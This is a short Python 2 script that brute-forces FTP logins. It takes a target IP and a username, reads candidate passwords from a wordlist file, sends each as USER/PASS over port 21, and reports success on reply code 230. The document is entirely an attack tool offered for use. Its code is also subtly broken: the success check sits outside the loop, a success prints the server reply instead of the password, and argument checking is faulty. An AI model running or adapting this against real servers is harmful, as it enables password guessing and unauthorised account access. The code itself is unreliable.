#!/usr/bin/python
import socket
import re
import sys

def usage():
	print "python brute1.py [IP] [Usuario]"
	sys.exit()

def main():
	if len(sys.argv) < 2:
		usage()
	else:
		brute()
	sys.exit()

def brute():
	user = sys.argv[2]
	file = open("lista.txt")
	for line in file.readlines():
		print "Testing...%s:%s" %(user,line)
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((sys.argv[1],21))
		s.recv(1024)
		s.send("USER "+user+"\r\n")
		s.recv(1024)
		s.send("PASS "+line+"\r\n")
		result = s.recv(1024)
		s.send("QUIT\r\n")
	if re.search("230", result):
		print "[+] Got the password: %s [+]"%(result)
	else:
		print "[-] You couldn't crack this shit [-]\n"
	sys.exit()
main()
